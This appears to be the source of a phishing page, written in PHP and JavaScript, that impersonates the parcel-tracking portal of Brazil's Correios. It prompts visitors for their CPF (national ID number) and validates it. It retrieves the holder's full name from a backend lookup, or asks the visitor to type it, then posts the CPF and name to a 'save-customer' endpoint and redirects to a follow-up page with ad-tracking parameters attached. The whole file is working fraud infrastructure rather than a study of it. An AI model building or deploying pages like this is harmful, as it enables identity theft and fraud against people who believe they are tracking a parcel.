<?php
require_once __DIR__ . '/includes/helpers.php';
session_start();
$config = app_config();
$_SESSION['tracking'] = array_merge($_SESSION['tracking'] ?? [], capture_tracking_params());
$trackingQuery = ltrim(build_query($_SESSION['tracking'] ?? []), '?');
?>
<html lang="pt-BR">

<head>
  <title>ENTRAR</title>
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"
    name="viewport" />
  <meta content="text/html; charset=utf-8" http-equiv="content-type" />
  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
  <link href="./imgs/favi-ect.png" rel="icon" />
  <link href="./imgs/favi-ect.png" rel="apple-touch-icon" />
  <meta content="" name="description" />
  <meta content="" name="keywords" />
  <meta content="all" name="robots" />
  <meta content="pt_BR" property="og:locale" />
  <meta content="article" property="og:type" />
  <link href="./css/style.css" rel="stylesheet" />
  <link crossorigin="" href="https://fonts.googleapis.com" rel="dns-prefetch preconnect" />
  <link crossorigin="" href="https://fonts.gstatic.com" rel="dns-prefetch preconnect" />
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
</head>

<body class="">
  <div id="site">
    <div class="gpc-b" id="b_1248129_1_17370464156789398f2bf7e">
      <div class="gpc-b_sobreposicao"></div>
      <div class="centralizar">
        <div class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f2bf9e102374210"
          id="e_1248129_1_17370464156789398f2bf9e102374210" style="white-space: normal">
          <div class="c e_texto" style="white-space: normal">
            <p>
              <span><b>Rastreamento</b></span>
            </p>
          </div>
        </div>
        <div class="gpc-e e_caixa dd dm e_1248129_1_17370464156789398f2c2c5633610212"
          id="e_1248129_1_17370464156789398f2c2c5633610212">
          <div class="c borda_igual e_caixa"></div>
        </div>
        <div class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f2c326419756588"
          id="e_1248129_1_17370464156789398f2c326419756588">
          <div class="c e_texto" style="white-space: normal">
            <p><b>Deseja acompanhar seu objeto?<br />Digite seu CPF abaixo.</b></p>
          </div>
        </div>
        <div class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f2c378980206316" id="texto_instrucao"
          style="white-space: normal">
          <div class="c e_texto" style="white-space: normal">
            <p>
              <span id="texto_instrucao_span"></span>
            </p>
          </div>
        </div>
        <div class="gpc-e e_formulario dd dm e_1248129_1_17370464156789398f2c3d5890029603"
          id="e_1248129_1_17370464156789398f2c3d5890029603" style="white-space: normal">
          <form class="c e_formulario" id="86a1c069-1635-8c99-4afd-36afc50ead32" style="white-space: normal">
            <fieldset>
              <div class="gpc_campos gpc_campos-input gpc_campos-100" id="campo_cpf_container">
                <div class="gpc_campos-titulo esconder">
                  <label for="input_1734416045"><span><em>*</em>CPF: 000.000.000-00</span><span
                      class="gpc_campos-titulo_descricao icone-informacao gtt-baixo esconder"
                      data-gtt=""></span></label>
                </div>
                <div class="gpc_campos-campo">
                  <input class="gpc_campo cpf obrigatorio" id="input_1734416045" name="cpf-000000000-00"
                    placeholder="* CPF: 000.000.000-00" type="text" value="" maxlength="14" />
                  <div class="gpc_campos-erro icone_bold-aviso gtt-esquerda" data-gtt=""></div>
                </div>
                <div class="gpc_campos-texto"></div>
              </div>
            </fieldset>
            <button class="gpc_botao borda_igual e_formulario">
              <span>Consultar</span>
            </button>
          </form>
        </div>
        <div class="gpc-e e_imagem dd dm e_1248129_1_17370464156789398f32122587196927"
          id="e_1248129_1_17370464156789398f32122587196927" style="white-space: normal">
          <div class="c imagem e_imagem" style="white-space: normal">
            <div class="imagem_fundo"></div>
          </div>
        </div>
        <div class="gpc-e e_imagem dd dm e_1248129_1_17370464156789398f32262597684658"
          id="e_1248129_1_17370464156789398f32262597684658" style="white-space: normal">
          <div class="c imagem e_imagem" style="white-space: normal">
            <div class="imagem_fundo"></div>
          </div>
        </div>
        <div class="gpc-e e_titulo dd dm e_1248129_1_17370464156789398f3234a507668651"
          id="e_1248129_1_17370464156789398f3234a507668651" style="white-space: normal">
          <div class="c e_titulo" style="white-space: normal">
            <h2>
              <span>Portal Correios </span><span>&gt; </span><span>Rastreamento </span>
            </h2>
          </div>
        </div>
        <div class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f3240e670180056" id="texto_atencao_cpf"
          style="white-space: normal">
          <div class="c e_texto" style="white-space: normal">
            <p>
              <span><b>Atenção:</b> Digite seu CPF sem pontos e traços (apenas
                números)</span>
            </p>
          </div>
        </div>
        <div class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f32469548758122 error"
          id="e_1248129_1_17370464156789398f32469548758122" style="white-space: normal">
          <div class="c e_texto" style="white-space: normal">
            <p><b class="textoerror" id="label_campo">CPF</b></p>
          </div>
        </div>
      </div>
    </div>
    <div class="gpc-b" id="b_1248129_1_17370464156789398f2bf98">
      <div class="gpc-b_sobreposicao"></div>
    </div>
  </div>
  <style>
    .obrigatorio.active {
      border: 1px solid red !important;
    }

    .error {
      width: auto !important;
    }

    .error.active {
      width: auto !important;
    }

    .textoerror.active {
      color: red !important;
    }

    #texto_instrucao {
      display: none;
    }

    @keyframes clienteButtonPulse {
      0%, 100% {
        transform: scale(1);
      }

      50% {
        transform: scale(1.018);
      }
    }

    #site button,
    #site .gpc_botao,
    #site a.e_botao.link_externo {
      animation: clienteButtonPulse 2.8s ease-in-out infinite;
      transform-origin: center;
      will-change: transform;
      box-shadow: none !important;
    }

    #site button:hover,
    #site .gpc_botao:hover,
    #site a.e_botao.link_externo:hover {
      animation-play-state: paused;
      transform: scale(1.02);
    }

    #site .gpc-e.e_caixa > .c,
    #site .toast-modal {
      border-radius: 8px !important;
      overflow: hidden;
    }

    #e_1248129_1_17370464156789398f32262597684658 .c,
    #e_1248129_1_17370464156789398f32262597684658 .imagem_fundo {
      border-radius: 0 !important;
      overflow: visible;
    }

    #e_1248129_1_17370464156789398f32122587196927 .c,
    #e_1248129_1_17370464156789398f32122587196927 .imagem_fundo {
      border-radius: 8px !important;
      overflow: hidden;
    }

    #e_1248129_1_17370464156789398f2c3d5890029603 .gpc_botao,
    #e_1248129_1_17370464156789398f2c3d5890029603 .gpc_botao span {
      background-color: rgb(30, 136, 229) !important;
      color: #ffffff !important;
    }

    #e_1248129_1_17370464156789398f2c3d5890029603 .gpc_botao {
      overflow: hidden;
    }

    #e_1248129_1_17370464156789398f2c3d5890029603 .gpc_botao span {
      align-items: center;
      display: flex;
      height: 100%;
      justify-content: center;
      width: 100%;
    }

    @media (max-width: 800px) {
      html,
      body {
        background: #ffffff;
        min-width: 0;
        width: 100%;
      }

      #site {
        max-width: 100vw;
        min-width: 0 !important;
        overflow-x: hidden;
        width: 100vw;
      }

      #site .centralizar {
        width: 360px;
      }

      #b_1248129_1_17370464156789398f2bf7e {
        height: 745px !important;
      }

      #e_1248129_1_17370464156789398f2c2c5633610212 {
        height: 275px !important;
      }

      #e_1248129_1_17370464156789398f2c326419756588 {
        top: 228px !important;
      }

      #e_1248129_1_17370464156789398f32469548758122 {
        top: 290px !important;
      }

      #e_1248129_1_17370464156789398f2c3d5890029603 {
        top: 308px !important;
      }

      #e_1248129_1_17370464156789398f2c3d5890029603 .gpc_botao {
        height: 50px !important;
        left: 10px !important;
        top: 108px !important;
        width: 280px !important;
      }

      #e_1248129_1_17370464156789398f32122587196927 {
        left: 20px !important;
        top: 585px !important;
        width: 320px !important;
        height: 96px !important;
      }

      #e_1248129_1_17370464156789398f32122587196927 .imagem_fundo {
        background-size: 320px 96px !important;
      }

      #e_1248129_1_17370464156789398f32262597684658 {
        left: calc((360px - 100vw) / 2) !important;
        width: 100vw !important;
      }

      #e_1248129_1_17370464156789398f32262597684658 .c,
      #e_1248129_1_17370464156789398f32262597684658 .imagem_fundo {
        width: 100vw !important;
      }

      #e_1248129_1_17370464156789398f32262597684658 .imagem_fundo {
        background-size: 100% 100% !important;
        background-position: center center !important;
      }

      #b_1248129_1_17370464156789398f2bf98 {
        background-color: rgb(255, 230, 0) !important;
        background-position: center center !important;
        background-repeat: no-repeat !important;
        background-size: 100% 100% !important;
        height: 190px !important;
        min-height: 190px;
        overflow: hidden;
      }

      #b_1248129_1_17370464156789398f2bf98 .gpc-b_sobreposicao {
        background-color: transparent !important;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      #site button,
      #site .gpc_botao,
      #site a.e_botao.link_externo {
        animation: none !important;
      }
    }

    .toast-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
    }

    .toast-overlay.show {
      opacity: 1;
      pointer-events: auto;
    }

    .toast-modal {
      background: #fff;
      border-radius: 16px;
      padding: 32px 48px;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
    }

    .toast-modal i {
      font-size: 48px;
      color: #28a745;
      margin-bottom: 16px;
    }

    .toast-modal p {
      margin: 0;
      font-size: 18px;
      font-weight: 600;
      color: #333;
    }
  </style>
  <script>
    window.APP_CONFIG = <?php echo json_encode([
        'cpfLookupNonce' => $config['cpf_lookup_nonce'],
        'customerFlowNonce' => $config['customer_flow_nonce'],
        'trackingUrl' => $trackingQuery,
    ], JSON_UNESCAPED_UNICODE); ?>;
  </script>
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const form = document.querySelector("form.e_formulario");
      const inputField = document.getElementById("input_1734416045");
      const btnConsultar = form.querySelector("button");
      const errorDiv = form.querySelector(".gpc_campos-erro");
      const textoErrorDiv = document.querySelector(".textoerror");
      const textoAtencao = document.getElementById("texto_atencao_cpf");

      const emailUrl = "";
      const telefoneUrl = "";
      const autoCpf = "";
      const cpfLookupNonce = window.APP_CONFIG.cpfLookupNonce;
      const customerFlowNonce = window.APP_CONFIG.customerFlowNonce;
      const trackingUrl = window.APP_CONFIG.trackingUrl || '';

      let modoNome = false;
      let cpfSalvo = "";

      const getFinalUrl = (base, params = {}) => {
          const urlParams = new URLSearchParams(trackingUrl || '');
          Object.entries(params).forEach(([key, value]) => {
              if (value) urlParams.set(key, value);
          });
          const query = urlParams.toString();
          return query ? `${base}?${query}` : base;
      };

      const saveCustomer = async (payload) => {
        const response = await fetch('/api/save-customer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
          body: JSON.stringify(Object.assign({ nonce: customerFlowNonce }, payload))
        });
        const data = await response.json();
        return data && data.success;
      };

      const showToast = (title, subtitle = '') => {
        let overlay = document.getElementById('toast-overlay');
        if (!overlay) {
          overlay = document.createElement('div');
          overlay.id = 'toast-overlay';
          overlay.className = 'toast-overlay';
          overlay.innerHTML = `
            <div class="toast-modal">
              <i class="fa-solid fa-circle-check"></i>
              <p id="toast-title"></p>
              <p id="toast-subtitle" style="font-size:14px; color:#666; font-weight:400; margin-top:8px;"></p>
            </div>
          `;
          document.body.appendChild(overlay);
        }
        document.getElementById('toast-title').textContent = title;
        document.getElementById('toast-subtitle').textContent = subtitle;
        overlay.classList.add('show');
        setTimeout(() => overlay.classList.remove('show'), 1800);
      };

      const isValidCPF = (cpf) => {
        if (typeof cpf !== "string") return false;
        cpf = cpf.replace(/[\s.-]*/igm, '');
        if (!cpf || cpf.length != 11 ||
          cpf == "00000000000" || cpf == "11111111111" ||
          cpf == "22222222222" || cpf == "33333333333" ||
          cpf == "44444444444" || cpf == "55555555555" ||
          cpf == "66666666666" || cpf == "77777777777" ||
          cpf == "88888888888" || cpf == "99999999999") {
          return false;
        }
        var soma = 0, resto;
        for (var i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
        resto = (soma * 10) % 11;
        if (resto == 10 || resto == 11) resto = 0;
        if (resto != parseInt(cpf.substring(9, 10))) return false;
        soma = 0;
        for (var i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
        resto = (soma * 10) % 11;
        if (resto == 10 || resto == 11) resto = 0;
        if (resto != parseInt(cpf.substring(10, 11))) return false;
        return true;
      };

      const mudarParaModoNome = () => {
        modoNome = true;
        showToast('CPF Válido', 'Agora digite seu nome completo');
        inputField.value = "";
        inputField.placeholder = "* Digite seu Nome Completo";
        inputField.removeAttribute("maxlength");
        inputField.classList.remove("cpf");
        textoAtencao.style.display = "none";

        document.getElementById('texto_instrucao').style.display = 'block';
        document.getElementById('texto_instrucao_span').innerHTML = 'Confirmação de identidade<br/>Digite seu nome completo';

        document.getElementById('label_campo').textContent = 'Nome';
        btnConsultar.querySelector('span').innerText = 'Continuar';
        inputField.focus();
      };

      const realizarConsulta = async (cpf) => {
        btnConsultar.disabled = true;
        btnConsultar.querySelector('span').innerText = 'Consultando...';

        try {
          const response = await fetch(`/api/api?cpf=${cpf}&nonce=${encodeURIComponent(cpfLookupNonce)}`);
          const data = await response.json();

          if (data.found) {
            const nomeDaApi = data.data.NOME;
            await saveCustomer({
                cpf: cpf,
                nome: nomeDaApi,
                email: emailUrl,
                telefone: telefoneUrl
            });
            const finalUrl = getFinalUrl('objeto.php', {
                cpf: cpf,
                nome: nomeDaApi,
                email: emailUrl,
                telefone: telefoneUrl
            });
            window.location.href = finalUrl;
          } else {
            cpfSalvo = cpf;
            mudarParaModoNome();
            btnConsultar.disabled = false;
          }
        } catch (error) {
          console.error("Erro na API", error);
          cpfSalvo = cpf;
          mudarParaModoNome();
          btnConsultar.disabled = false;
        }
      };

      if (autoCpf && isValidCPF(autoCpf)) {
          inputField.value = autoCpf;
          setTimeout(() => realizarConsulta(autoCpf), 500);
      }

      inputField.addEventListener("input", (e) => {
        if (modoNome) {
          e.target.value = e.target.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '');
          return;
        }

        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 11) value = value.substring(0, 11);
        if (value.length > 3) value = value.replace(/(\d{3})(\d)/, "$1.$2");
        if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
        if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
        e.target.value = value;
      });

      btnConsultar.addEventListener("click", async (e) => {
        e.preventDefault();
        errorDiv.classList.remove("active");
        textoErrorDiv.classList.remove("active");
        inputField.classList.remove("active");

        if (modoNome) {
          const nome = inputField.value.trim();
          if (nome.length < 3) {
            textoErrorDiv.classList.add("textoerror", "active");
            textoErrorDiv.textContent = "Por favor, digite seu nome completo.";
            return;
          }
          
          await saveCustomer({
              cpf: cpfSalvo,
              nome: nome,
              email: emailUrl,
              telefone: telefoneUrl
          });
          const finalUrl = getFinalUrl('objeto.php', {
              cpf: cpfSalvo,
              nome: nome,
              email: emailUrl,
              telefone: telefoneUrl
          });
          window.location.href = finalUrl;
          return;
        }

        const cpf = inputField.value.replace(/\D/g, "");

        if (!isValidCPF(cpf)) {
          inputField.classList.add("obrigatorio", "active");
          errorDiv.classList.add("error", "active");
          textoErrorDiv.classList.add("textoerror", "active");
          textoErrorDiv.textContent = "CPF Inválido!";
          return;
        }

        realizarConsulta(cpf);
      });
    });
  </script>
</body>

</html>
